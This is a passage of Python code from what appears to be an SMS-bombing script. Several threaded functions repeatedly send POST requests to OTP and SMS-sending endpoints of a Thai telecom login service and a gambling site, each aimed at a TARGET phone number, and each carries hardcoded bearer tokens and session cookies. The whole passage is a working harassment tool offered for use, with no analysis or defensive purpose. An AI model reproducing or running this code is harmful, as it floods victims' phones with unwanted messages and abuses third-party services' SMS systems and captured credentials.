            racs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(racs)
        threading.Thread(target=ac).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ad():
            rads=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rads)
        threading.Thread(target=ad).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ae():
            raes=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(raes)
        threading.Thread(target=ae).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def af():
            rafs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rafs)
        threading.Thread(target=af).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ag():
            rags=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rags)
        threading.Thread(target=ag).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ah():
            rahs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rahs)
        threading.Thread(target=ah).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ai():
            rais=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rais)
        threading.Thread(target=ai).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def aj():
            rajs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rajs)
        threading.Thread(target=aj).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ak():
            raks=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(raks)
        threading.Thread(target=ak).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def al():
            rals=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rals)
        threading.Thread(target=al).start()
